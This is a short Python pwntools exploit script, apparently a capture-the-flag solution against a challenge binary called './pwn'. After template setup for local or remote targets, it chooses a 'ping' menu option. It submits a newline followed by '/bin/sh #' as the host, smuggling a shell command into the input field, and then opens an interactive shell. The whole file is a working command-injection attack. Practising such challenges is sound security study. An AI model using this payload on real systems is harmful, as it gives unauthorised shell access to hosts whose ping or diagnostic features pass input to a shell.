from pwn import *
import sys
context(arch='amd64', os='linux')

file_name = './pwn'

elf = ELF(file_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1

if switch:
    target = ''
    port   = 0
    p = remote(target, port)
else:
    p = process(file_name)

if debug:
    context(log_level='debug')

if gdb_ and switch == 0:
    gdb.attach(p)
    pause()

s    = lambda data                : p.send(data)
sa   = lambda delim, data         : p.sendafter(delim, data)
sl   = lambda data                : p.sendline(data)
sla  = lambda delim, data         : p.sendlineafter(delim, data)
r    = lambda numb=4096          : p.recv(numb)
ru   = lambda delim, drop=True   : p.recvuntil(delim, drop)
rl   = lambda                    : p.recvline()
lg   = lambda name, data         : log.success(name + ': ' + hex(data))
uu64 = lambda data                : u64(data.ljust(8, b'\x00'))

#################################################################################

sla(b'Your choice:',b'4')
payload = flat([
    '\n/bin/sh #'
])
sla(b'Enter host to ping: ',payload)
p.interactive()